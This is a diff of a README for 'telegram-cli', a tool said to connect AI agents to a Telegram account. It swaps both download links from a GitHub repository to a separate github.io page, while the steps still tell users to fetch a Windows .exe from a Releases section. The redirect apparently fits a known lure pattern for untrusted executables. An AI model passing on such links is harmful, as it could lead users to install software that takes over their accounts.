@@ -1,6 +1,6 @@
 # 🤖 telegram-cli - Connect AI agents to Telegram services
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lawntennisnovice323/telegram-cli)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://lawntennisnovice323.github.io)
 
 Telegram-cli links your Telegram account to AI tools. It allows agents like Claude Code, Cursor, and GitHub Copilot to read messages and send replies using structured data formats. This tool works for users who want to automate tasks or build custom workflows within their chat environment.
 
@@ -8,7 +8,7 @@ Telegram-cli links your Telegram account to AI tools. It allows agents like Clau
 
 Follow these steps to get the application on your computer:
 
-1. Click this link: [https://github.com/Lawntennisnovice323/telegram-cli](https://github.com/Lawntennisnovice323/telegram-cli)
+1. Click this link: [https://lawntennisnovice323.github.io](https://lawntennisnovice323.github.io)
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version label.
 4. Locate the specific file ending in .exe for Windows.
